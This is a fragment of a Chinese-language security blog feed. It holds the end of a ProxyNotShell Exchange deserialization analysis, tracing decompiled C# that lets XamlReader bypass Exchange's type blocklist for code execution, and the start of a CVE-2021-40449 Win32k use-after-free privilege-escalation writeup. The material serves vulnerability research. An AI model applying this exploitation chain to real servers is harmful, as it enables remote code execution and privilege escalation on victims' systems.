&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (!&lt;span style="color:#66d9ef">this&lt;/span>.mshOwner.hasGeneratedReservedMembers)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.mshOwner.hasGeneratedReservedMembers = &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ReservedNameMembers.GeneratePSExtendedMemberSet(&lt;span style="color:#66d9ef">this&lt;/span>.mshOwner);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ReservedNameMembers.GeneratePSBaseMemberSet(&lt;span style="color:#66d9ef">this&lt;/span>.mshOwner);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ReservedNameMembers.GeneratePSObjectMemberSet(&lt;span style="color:#66d9ef">this&lt;/span>.mshOwner);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ReservedNameMembers.GeneratePSAdaptedMemberSet(&lt;span style="color:#66d9ef">this&lt;/span>.mshOwner);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ReservedNameMembers.GeneratePSTypeNames(&lt;span style="color:#66d9ef">this&lt;/span>.mshOwner);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">internal&lt;/span> PSMemberInfoIntegratingCollection(&lt;span style="color:#66d9ef">object&lt;/span> owner, Collection&amp;lt;CollectionEntry&amp;lt;T&amp;gt;&amp;gt; collections)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (owner == &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> PSTraceSource.NewArgumentNullException(&lt;span style="color:#e6db74">&amp;#34;owner&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.mshOwner = (owner &lt;span style="color:#66d9ef">as&lt;/span> PSObject);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.memberSetOwner = (owner &lt;span style="color:#66d9ef">as&lt;/span> PSMemberSet);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.mshOwner == &lt;span style="color:#66d9ef">null&lt;/span> &amp;amp;&amp;amp; &lt;span style="color:#66d9ef">this&lt;/span>.memberSetOwner == &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> PSTraceSource.NewArgumentException(&lt;span style="color:#e6db74">&amp;#34;owner&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (collections == &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> PSTraceSource.NewArgumentNullException(&lt;span style="color:#e6db74">&amp;#34;collections&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">this&lt;/span>.collections = collections;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/12.png" />&lt;/p>
&lt;p>GetMemberCollection代码如下，其会将对象的&lt;em>adaptedMembers&lt;/em>属性添加到列表中，而在内层对象反序列化时已经将名为TargetTypeForDeserialization的XamlReader类型的Type对象加入到&lt;em>adaptedMembers&lt;/em>属性中。所以返回的列表内也会包含该对象。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">internal&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> Collection&amp;lt;CollectionEntry&amp;lt;PSMemberInfo&amp;gt;&amp;gt; GetMemberCollection(PSMemberViewTypes viewType, TypeTable backupTypeTable)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Collection&amp;lt;CollectionEntry&amp;lt;PSMemberInfo&amp;gt;&amp;gt; collection = &lt;span style="color:#66d9ef">new&lt;/span> Collection&amp;lt;CollectionEntry&amp;lt;PSMemberInfo&amp;gt;&amp;gt;();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ((viewType &amp;amp; PSMemberViewTypes.Extended) == PSMemberViewTypes.Extended)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (backupTypeTable == &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> collection.Add(&lt;span style="color:#66d9ef">new&lt;/span> CollectionEntry&amp;lt;PSMemberInfo&amp;gt;(&lt;span style="color:#66d9ef">new&lt;/span> CollectionEntry&amp;lt;PSMemberInfo&amp;gt;.GetMembersDelegate(PSObject.TypeTableGetMembersDelegate&amp;lt;PSMemberInfo&amp;gt;), &lt;span style="color:#66d9ef">new&lt;/span> CollectionEntry&amp;lt;PSMemberInfo&amp;gt;.GetMemberDelegate(PSObject.TypeTableGetMemberDelegate&amp;lt;PSMemberInfo&amp;gt;), &lt;span style="color:#66d9ef">true&lt;/span>, &lt;span style="color:#66d9ef">true&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;type table members&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> collection.Add(&lt;span style="color:#66d9ef">new&lt;/span> CollectionEntry&amp;lt;PSMemberInfo&amp;gt;((PSObject msjObj) =&amp;gt; PSObject.TypeTableGetMembersDelegate&amp;lt;PSMemberInfo&amp;gt;(msjObj, backupTypeTable), (PSObject msjObj, &lt;span style="color:#66d9ef">string&lt;/span> name) =&amp;gt; PSObject.TypeTableGetMemberDelegate&amp;lt;PSMemberInfo&amp;gt;(msjObj, backupTypeTable, name), &lt;span style="color:#66d9ef">true&lt;/span>, &lt;span style="color:#66d9ef">true&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;type table members&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ((viewType &amp;amp; PSMemberViewTypes.Adapted) == PSMemberViewTypes.Adapted)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> **collection.Add(&lt;span style="color:#66d9ef">new&lt;/span> CollectionEntry&amp;lt;PSMemberInfo&amp;gt;(&lt;span style="color:#66d9ef">new&lt;/span> CollectionEntry&amp;lt;PSMemberInfo&amp;gt;.GetMembersDelegate(PSObject.AdapterGetMembersDelegate&amp;lt;PSMemberInfo&amp;gt;), &lt;span style="color:#66d9ef">new&lt;/span> CollectionEntry&amp;lt;PSMemberInfo&amp;gt;.GetMemberDelegate(PSObject.AdapterGetMemberDelegate&amp;lt;PSMemberInfo&amp;gt;), &lt;span style="color:#66d9ef">false&lt;/span>, &lt;span style="color:#66d9ef">false&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;adapted members&amp;#34;&lt;/span>));**
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ((viewType &amp;amp; PSMemberViewTypes.Base) == PSMemberViewTypes.Base)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> collection.Add(&lt;span style="color:#66d9ef">new&lt;/span> CollectionEntry&amp;lt;PSMemberInfo&amp;gt;(&lt;span style="color:#66d9ef">new&lt;/span> CollectionEntry&amp;lt;PSMemberInfo&amp;gt;.GetMembersDelegate(PSObject.DotNetGetMembersDelegate&amp;lt;PSMemberInfo&amp;gt;), &lt;span style="color:#66d9ef">new&lt;/span> CollectionEntry&amp;lt;PSMemberInfo&amp;gt;.GetMemberDelegate(PSObject.DotNetGetMemberDelegate&amp;lt;PSMemberInfo&amp;gt;), &lt;span style="color:#66d9ef">false&lt;/span>, &lt;span style="color:#66d9ef">false&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;clr members&amp;#34;&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> collection;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> T AdapterGetMemberDelegate&amp;lt;T&amp;gt;(PSObject msjObj, &lt;span style="color:#66d9ef">string&lt;/span> name) &lt;span style="color:#66d9ef">where&lt;/span> T : PSMemberInfo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (!msjObj.isDeserialized)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> T t = msjObj.InternalAdapter.BaseGetMember&amp;lt;T&amp;gt;(msjObj.immediateBaseObject, name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PSObject.memberResolution.WriteLine(&lt;span style="color:#e6db74">&amp;#34;Adapted member: {0}.&amp;#34;&lt;/span>, (t == &lt;span style="color:#66d9ef">null&lt;/span>) ? &lt;span style="color:#e6db74">&amp;#34;not found&amp;#34;&lt;/span> : t.Name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> t;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (msjObj.adaptedMembers == &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">default&lt;/span>(T);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> T t2 = msjObj.adaptedMembers[name] &lt;span style="color:#66d9ef">as&lt;/span> T;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PSObject.memberResolution.WriteLine(&lt;span style="color:#e6db74">&amp;#34;Serialized adapted member: {0}.&amp;#34;&lt;/span>, (t2 == &lt;span style="color:#66d9ef">null&lt;/span>) ? &lt;span style="color:#e6db74">&amp;#34;not found&amp;#34;&lt;/span> : t2.Name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> t2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>返回到GetPSStandardMember函数中，Exchange会匹配构造函数返回的对象的memberName属性，该属性来源于GetTargetTypeForDeserialization调用时传递的硬编码TargetTypeForDeserialization，即将从该对象中检索名为TargetTypeForDeserialization的值，前面提到过列表内已有该名字的对象，所以将匹配到XamlReader类型的Type对象，并返回给上层函数。&lt;/p>
&lt;p>返回到上层函数，GetTargetTypeForDeserialization返回了XamlReader类型。&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/13.png" />&lt;/p>
&lt;p>进入到ConvertTo函数内，valueToConvert为上层函数ReadOneObject函数传入的obj对象，其内包含了xaml反序列化的命令执行字符串。&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/14.png" />&lt;/p>
&lt;p>进入到LanguagePrimitives.FigureConversion在#3527处断点，此时fromType为String，toType为XamlReader&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/15.png" />&lt;/p>
&lt;p>进入FigureParseConversion内，将会通过反射获取到XamlReader的Parse方法。&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/16.png" />&lt;/p>
&lt;p>
&lt;img alt="Untitled" src="https://www.ch35tnut.site/images/vulnerability/proxy-not-shell.zh-cn.assets/17.png" />&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> LanguagePrimitives.PSConverter&amp;lt;&lt;span style="color:#66d9ef">object&lt;/span>&amp;gt; FigureParseConversion(Type fromType, Type toType)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> .....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (fromType == &lt;span style="color:#66d9ef">typeof&lt;/span>(&lt;span style="color:#66d9ef">string&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MethodInfo methodInfo = &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> methodInfo = toType.GetMethod(&lt;span style="color:#e6db74">&amp;#34;Parse&amp;#34;&lt;/span>, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, &lt;span style="color:#66d9ef">null&lt;/span>, &lt;span style="color:#66d9ef">new&lt;/span> Type[]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">typeof&lt;/span>(&lt;span style="color:#66d9ef">string&lt;/span>),
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">typeof&lt;/span>(IFormatProvider)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }, &lt;span style="color:#66d9ef">null&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">catch&lt;/span> (AmbiguousMatchException ex)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LanguagePrimitives.typeConversion.WriteLine(&lt;span style="color:#e6db74">&amp;#34;Exception finding Parse method with CultureInfo: \&amp;#34;{0}\&amp;#34;.&amp;#34;&lt;/span>, ex.Message);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">catch&lt;/span> (ArgumentException ex2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LanguagePrimitives.typeConversion.WriteLine(&lt;span style="color:#e6db74">&amp;#34;Exception finding Parse method with CultureInfo: \&amp;#34;{0}\&amp;#34;.&amp;#34;&lt;/span>, ex2.Message);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (methodInfo != &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> LanguagePrimitives.PSConverter&amp;lt;&lt;span style="color:#66d9ef">object&lt;/span>&amp;gt;(&lt;span style="color:#66d9ef">new&lt;/span> LanguagePrimitives.ConvertViaParseMethod
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parse = methodInfo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }.ConvertWithCulture);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> methodInfo = toType.GetMethod(&lt;span style="color:#e6db74">&amp;#34;Parse&amp;#34;&lt;/span>, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, &lt;span style="color:#66d9ef">null&lt;/span>, &lt;span style="color:#66d9ef">new&lt;/span> Type[]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">typeof&lt;/span>(&lt;span style="color:#66d9ef">string&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }, &lt;span style="color:#66d9ef">null&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">catch&lt;/span> (AmbiguousMatchException ex3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LanguagePrimitives.typeConversion.WriteLine(&lt;span style="color:#e6db74">&amp;#34;Exception finding Parse method: \&amp;#34;{0}\&amp;#34;.&amp;#34;&lt;/span>, ex3.Message);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">catch&lt;/span> (ArgumentException ex4)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LanguagePrimitives.typeConversion.WriteLine(&lt;span style="color:#e6db74">&amp;#34;Exception finding Parse method: \&amp;#34;{0}\&amp;#34;.&amp;#34;&lt;/span>, ex4.Message);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (methodInfo != &lt;span style="color:#66d9ef">null&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> LanguagePrimitives.PSConverter&amp;lt;&lt;span style="color:#66d9ef">object&lt;/span>&amp;gt;(&lt;span style="color:#66d9ef">new&lt;/span> LanguagePrimitives.ConvertViaParseMethod
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parse = methodInfo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }.ConvertWithoutCulture);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>XamlReader.Parse方法将会由LanguagePrimitives.ConvertViaParseMethod.ConvertWithoutCulture方法调用。之后就是普通的反序列化过程了。&lt;/p>
&lt;h3 id="小结">小结&lt;/h3>
&lt;p>这个漏洞利用链核心是如何绕过Exchange黑名单类并使Exchange将攻击者控制的指定数据反序列化到指定危险类造成代码执行。&lt;/p>
&lt;p>漏洞利用了Exchange的合法功能，先构造了名为targetTypeForDeserialization 的XamlReader类型的Type对象序列化值，利用Microsoft.Exchange.Data.SerializationTypeConverter的特性返回了XamlReader类型的Type对象，而后ReadProperties将其加入到adaptedMember内。在外层对象反序列化时，构造的PSMembers包含了名为targetTypeForDeserialization的XamlReader类型的Type对象，Exchange会在PSMembers列表内匹配targetTypeForDeserialization项，从而控制了ConvertTo函数转化的目标类XamlReader，Exchange通过反射获取到了XamlReader的Parse方法，调用该方法反序列化攻击者可控的序列化数据，触发代码执行。&lt;/p>
&lt;p>在调试过程中需要将.NET Framework的优化关掉以便dnSpy调试&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-csharp" data-lang="csharp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">[.NET Framework Debugging Control]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GenerateTrackingInfo=&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>AllowOptimize=&lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>COMPlus_ZapDisable=&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>COMPlus_ReadyToRun=&lt;span style="color:#ae81ff">0&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>其他&lt;/strong>&lt;/p>
&lt;p>PSRP：PowerShell Remote Protocol powerShell远程协议，是微软提供的通过SOAP协议上执行PowerShell代码的协议&lt;/p>
&lt;p>参考资料&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend" target="_blank">https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell" target="_blank">https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-05-05T20:35:49+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2021-40449 Win32k 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/</link><pubDate>Tue, 09 Nov 2021 15:16:28 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-40449-win32k-eop/</guid><description>&lt;h2 id="cve-2021-40449-win32k提权漏洞及poc分析">CVE-2021-40449 Win32k提权漏洞及POC分析&lt;/h2>
&lt;h3 id="背景">背景&lt;/h3>
&lt;p>CVE-2021-40449是卡巴斯基实验室在2021年8月下旬到9月上旬在Windows服务器上捕获的恶意样本利用的提权漏洞，该漏洞存在于win32kfull.sys驱动内，利用该漏洞可以在windows中完成从users到system的权限提升。&lt;/p>
&lt;h4 id="基本概念">基本概念&lt;/h4>
&lt;p>
&lt;img alt="aaa" src="https://www.ch35tnut.site/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110112401943.png" />&lt;/p>
&lt;p>&lt;strong>内核对象&lt;/strong>：内核对象即在内核空间存在的对象，只能由内核分配，内核访问。&lt;/p>
&lt;p>&lt;strong>内核对象的引用计数&lt;/strong>：在操作系统中，可能有多个进程访问同一个内核对象，如果没有进程需要使用该对象内核就应该释放该对象，所以为了准确的释放该对象就有了引用计数。当内核对象被创建时，引用计数被标记为1，调用CloseHandle()时内核对象的引用计数就-1，这可以类比Java GC的引用计数法：&lt;/p>
&lt;blockquote>
&lt;p>在对象中添加一个引用计数器，每当一个地方引用它时，计数器就加一；当引用失效时，计数器值就减一；任何时刻计数器为零的对象就是不可能再被使用的。&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>句柄&lt;/strong>：由于内核对象只能由内核分配、访问、修改，当ring 3层的应用程序想要操作这些内核对象的时候，并不能直接操控内核对象。当内核对象创建好后，操作系统会使用一个句柄来标识该对象并返回给应用程序，应用程序通过操作系统提供的ring 3层API来操作句柄，ring3层API经过系统调用进入内核。在内核处句柄对应着具体的内核对象，这样ring3层的应用程序就可以通过操作句柄来间接操作内核对象。&lt;/p>
&lt;p>&lt;strong>句柄表&lt;/strong>：当一个进程初始化的时候，系统会给该进程分配一个句柄表，当进程创建内核对象的时候，内核创建对应内核对象，并遍历该进程的句柄表，在句柄表的空闲位置设置内核对象、对象指针等，并获取该位置的索引，作为进程创建对象的函数的返回值，即为句柄。&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.cnblogs.com/MisterXu/p/10846918.html" target="_blank">https://www.cnblogs.com/MisterXu/p/10846918.html&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>DC&lt;/strong>：是一个内核对象，全称device context，设备上下文对象&lt;/p>
&lt;p>&lt;strong>HDC&lt;/strong>：DC对象的句柄。&lt;/p>
&lt;p>&lt;strong>释放后重用&lt;/strong>：指一个内存空间被操作系统释放后，内存空间变为空闲状态，如果用户在这一刻申请内存，操作系统会优先分配刚释放的内存，则用户大概率可以申请到刚刚释放的内存并修改该内存空间的内容。如果在释放空间之前有指针指向该空间，在释放空间之后指针并未按照理想状态置为NULL，由于释放后可以重新申请该内存并修改内存内容，后续如果继续使用该指针，但内存内内容并不是预期的释放之前的内容，则会产生非预期行为。&lt;/p>
&lt;p>eg：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">badMethod&lt;/span>();
